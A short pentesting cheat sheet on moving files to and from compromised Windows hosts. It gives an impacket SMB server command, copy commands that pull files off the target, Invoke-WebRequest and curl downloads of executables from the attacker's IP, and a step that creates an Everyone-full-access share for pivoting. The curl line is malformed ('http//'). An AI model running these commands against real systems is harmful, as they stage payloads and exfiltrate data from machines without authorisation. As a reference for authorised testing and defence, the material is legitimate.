---
title: File Transfer
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/file-transfer
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---
## SMB

Using impacket:

```
# Setup smb share named 'tmp' in current directory with SMB2 support
impacket-smbserver tmp . -smb2support

# From target host to local host:
copy <file> \\local-ip\tmp

# From local host to target host
copy \\local-ip\tmp\file.ps1
```

## PowerShell

```
Invoke-WebRequest -u 'http://local-ip/file.exe' -o file.exe
```

## Curl

```
curl http//local-ip/file.exe -o file.exe
```

## Create and use shares

* If you cannot reach your own IP, but you have two compromised hosts that can reach each other.&#x20;

```
# Create share
net share SHARENAME=C:\PATH\TO\DIRECTORY /GRANT:Everyone,FULL

# Use share
net use Z: \\hostname\sharename /user:username 'password'
```
